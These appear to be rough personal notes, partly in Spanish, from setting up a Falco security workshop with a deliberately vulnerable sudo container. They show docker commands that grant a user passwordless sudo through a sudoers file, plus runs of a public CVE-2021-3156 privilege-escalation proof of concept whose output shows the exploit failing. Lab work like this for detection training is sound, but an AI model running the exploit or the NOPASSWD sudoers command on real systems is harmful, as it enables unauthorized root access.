    
    
    
    
    
    docker build -t vulnerable-sudo-image .
    docker build -t --cache diegoall1990/vuln-sudo-falco-workshop:0.0.1 .

    docker run -it --name falco-workshop -h training diegoall1990/falco-workshop:tagname

    docker run -it vulnerable-sudo-image /bin/bash
    docker run -it -d --name vuln-sudo-falco-workshop -h victim diegoall1990/vuln-sudo-falco-workshop:0.0.1


    docker exec -u root vuln-sudo-falco-workshop /bin/bash -c 'usermod -aG sudo falcox && echo "falcox ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/falcox'

    docker exec -it -u falcox vuln-sudo-falco-workshop /bin/bash



        falcox@victim:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0      

        ** CVE-2021-3156 PoC by blasty <peter@haxx.in>

        using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
        ** pray for your rootshell.. **
        sudoedit: /usr/bin/editor: command not found


Falta el hpta binario /usr/bin/editor pero si esta /usr/bin/sudoedit

resulta qe /usr/bin/editor es nano.

Me traje nano y nada


    falcox@victim:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>

    using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
    ** pray for your rootshell.. **
    sudoedit: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\: editing files in a writable directory is not permitted
    sudoedit: \: editing files in a writable directory is not permitted
    sudoedit: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\: editing files in a writable directory is not permitted


ldd /usr/bin/sudo


NO DA QUIZAS TOCA PELUQUIAR LA IMAGEN VIEJA